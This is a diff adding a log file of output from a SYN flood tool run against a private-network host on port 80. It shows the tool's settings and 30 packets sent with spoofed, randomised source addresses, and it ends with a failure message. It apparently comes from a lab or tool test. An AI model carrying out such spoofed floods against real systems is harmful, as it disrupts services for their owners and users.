@@ -1,0 +1,39 @@
+[*] executing SYN Flooder with the following configurations
+[*] source ip: 172.16.48.12
+[*] target_ip: 172.16.48.79
+[*] dPort: 80
+[*] total packets to send: 20
+[*] threads: 10
+[*] loop: 30
+[*] [1] sending IP / TCP 57.102.153.228:45542 > 172.16.48.79:http S
+[*] [2] sending IP / TCP 72.17.218.163:53765 > 172.16.48.79:http S
+[*] [3] sending IP / TCP 148.55.201.198:39666 > 172.16.48.79:http S
+[*] [4] sending IP / TCP 3.110.28.234:50394 > 172.16.48.79:http S
+[*] [5] sending IP / TCP 218.58.88.160:48669 > 172.16.48.79:http S
+[*] [6] sending IP / TCP 231.82.118.211:5581 > 172.16.48.79:http S
+[*] [7] sending IP / TCP 42.143.246.102:56967 > 172.16.48.79:http S
+[*] [8] sending IP / TCP 81.17.4.22:58850 > 172.16.48.79:http S
+[*] [9] sending IP / TCP 188.63.201.128:16570 > 172.16.48.79:http S
+[*] [10] sending IP / TCP 213.147.78.109:12890 > 172.16.48.79:http S
+[*] [11] sending IP / TCP 112.8.198.130:28548 > 172.16.48.79:http S
+[*] [12] sending IP / TCP 244.31.191.96:52995 > 172.16.48.79:http S
+[*] [13] sending IP / TCP 196.161.193.93:44368 > 172.16.48.79:http S
+[*] [14] sending IP / TCP 168.184.222.116:15743 > 172.16.48.79:http S
+[*] [15] sending IP / TCP 212.150.94.211:16585 > 172.16.48.79:http S
+[*] [16] sending IP / TCP 100.240.216.52:19586 > 172.16.48.79:http S
+[*] [17] sending IP / TCP 138.18.132.5:51052 > 172.16.48.79:http S
+[*] [18] sending IP / TCP 78.223.155.222:35715 > 172.16.48.79:http S
+[*] [19] sending IP / TCP 92.210.32.158:32746 > 172.16.48.79:http S
+[*] [20] sending IP / TCP 59.115.32.240:31641 > 172.16.48.79:http S
+[*] [21] sending IP / TCP 208.125.59.244:64732 > 172.16.48.79:http S
+[*] [22] sending IP / TCP 44.141.10.197:65410 > 172.16.48.79:http S
+[*] [23] sending IP / TCP 49.126.128.110:37098 > 172.16.48.79:http S
+[*] [24] sending IP / TCP 14.134.147.64:579 > 172.16.48.79:http S
+[*] [25] sending IP / TCP 202.75.145.15:23265 > 172.16.48.79:http S
+[*] [26] sending IP / TCP 51.192.116.55:28478 > 172.16.48.79:http S
+[*] [27] sending IP / TCP 148.216.179.134:2284 > 172.16.48.79:http S
+[*] [28] sending IP / TCP 223.38.118.2:25710 > 172.16.48.79:http S
+[*] [29] sending IP / TCP 77.223.48.123:2101 > 172.16.48.79:http S
+[*] [30] sending IP / TCP 91.117.199.78:28853 > 172.16.48.79:http S
+[!] WARNING: Mac address to reach destination not found. Using broadcast.
+Unable to start attack.
